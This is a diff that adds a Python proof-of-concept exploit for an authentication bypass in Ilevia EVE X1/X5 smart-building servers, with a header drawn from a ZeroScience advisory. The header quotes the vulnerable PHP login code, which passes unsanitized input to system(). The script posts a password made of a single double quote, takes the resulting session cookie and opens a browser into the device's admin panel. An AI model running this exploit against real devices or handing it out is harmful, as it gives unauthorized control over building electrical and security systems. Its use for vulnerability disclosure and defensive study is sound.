@@ -1,0 +1,142 @@
+#!/usr/bin/env python
+#
+#
+# Ilevia EVE X1/X5 Server 4.7.18.0.eden Authentication Bypass Exploit
+#
+#
+# Vendor: Ilevia Srl.
+# Product web page: https://www.ilevia.com
+# Affected version: <= 4.7.18.0.eden (Logic ver: 6.00)
+#
+# Summary: EVE is a smart home and building automation solution designed
+# for both residential and commercial environments, including malls, hotels,
+# restaurants, bars, gyms, spas, boardrooms, and offices. It enables comprehensive
+# control and monitoring of electrical installations through a highly customizable,
+# user-friendly interface.
+#
+# EVE is a multi-protocol platform that integrates various systems within
+# a smart building to enhance comfort, security, safety, and energy efficiency.
+# Users can manage building functions via iPhone, iPad, Android devices, Windows
+# PCs, or Mac computers.
+#
+# The EVE X1 Server is the dedicated hardware solution for advanced building
+# automation needs. Compact and powerful, it is ideal for apartments, small
+# to medium-sized homes, and smaller commercial installations. It is designed
+# to manage entire automation systems reliably and efficiently.
+#
+# Desc: The application constructs a shell command using unsanitized user input
+# passed to the system() function, calling an external binary for authentication.
+# Due to improper input handling and reliance on the binary's return value for
+# access control, an attacker can inject special characters, such as a double
+# quote (") to manipulate command parsing and induce execution failure. Since
+# the application interprets any non-zero exit code from the binary as successful
+# authentication, this flaw allows remote users to bypass authentication entirely
+# without providing valid credentials.
+#
+# ------------------------------------------------------------------------------
+# /login/login.php:
+# -----------------
+# 22: $strCmd = "/ilevia/bin/ilevia_authenticate -u \"" . $_POST["userid"] . "\" -p \"" . $_POST["passwd"] . "\"";
+# 23: system($strCmd,$retVal);
+# 24: if($retVal > 0){
+# 25:   $_SESSION["authorized"] = 1;
+# 26:   $destinazione = "../main/index.php";
+# ------------------------------------------------------------------------------
+#
+# Tested on: GNU/Linux 5.4.35 (armv7l)
+#            GNU/Linux 4.19.97 (armv7l)
+#            Armbian 20.02.1 Buster
+#            Apache/2.4.38 (Debian)
+#            PHP Version 7.3.14
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2025-5958
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2025-5958.php
+#
+#
+# 01.05.2024
+#
+
+
+from webdriver_manager.firefox import GeckoDriverManager as GDM
+from webdriver_manager.chrome import ChromeDriverManager as CDM
+from selenium.webdriver.firefox.service import Service as FS
+from selenium.webdriver.chrome.service import Service as CS
+from selenium.webdriver.common.by import By
+from selenium import webdriver
+import sys, time, requests
+
+def meta(ip_port):
+    if ':' not in ip_port:
+        ip_port += ':8080'
+    return f"http://{ip_port}"
+
+def auth(url):
+    log_in = f"{url}/login/login.php"
+    data = {
+        "userid": "admin",
+        "passwd": "\"",
+        "login": "Login"
+    }
+    sess = requests.Session()
+    r = sess.post(log_in, data=data, timeout=5)
+    if "PHPSESSID" in sess.cookies:
+        sess_id = sess.cookies.get("PHPSESSID")
+        print(f"..> Authenticated. PHPSESSID={sess_id}")
+        return sess_id, sess.cookies.get_dict(), url
+    else:
+        print("..> Failed to get PHPSESSID.")
+        sys.exit(1)
+
+def surfaj(sess_id, url, browser='chrome'):
+    print("..> Launching browser...")
+
+    options = None
+    driver = None
+    domain = url.split("//")[1].split(":")[0]
+    port = url.split(":")[-1]
+    cookie_D = domain
+
+    if browser == 'chrome':
+        options = webdriver.ChromeOptions()
+        driver = webdriver.Chrome(service=CS(CDM().install()), options=options)
+    elif browser == 'firefox':
+        options = webdriver.FirefoxOptions()
+        driver = webdriver.Firefox(service=FS(GDM().install()), options=options)
+    else:
+        print("..> Unsupported browser.")
+        return
+
+    driver.get(f"{url}/login/login.php")
+
+    driver.add_cookie({
+        "name": "PHPSESSID",
+        "value": sess_id,
+        "domain": cookie_D,
+        "path": "/"
+    })
+
+    time.sleep(1)
+    driver.get(f"{url}/main/index.php")
+
+    print("..> Wait for it.")
+    input("..> Press Enter to close the browser...\n")
+    driver.quit()
+
+def main():
+    if len(sys.argv) != 2:
+        print(f"Usage: python {sys.argv[0]} <IP[:PORT]>")
+        sys.exit(1)
+
+    smart = sys.argv[1]
+    url = meta(smart)
+    sess_id, cookies, url = auth(url)
+    print(f"..> Cookie: PHPSESSID={sess_id}")
+    surfaj(sess_id, url, browser='chrome')
+
+if __name__ == "__main__":
+    main()
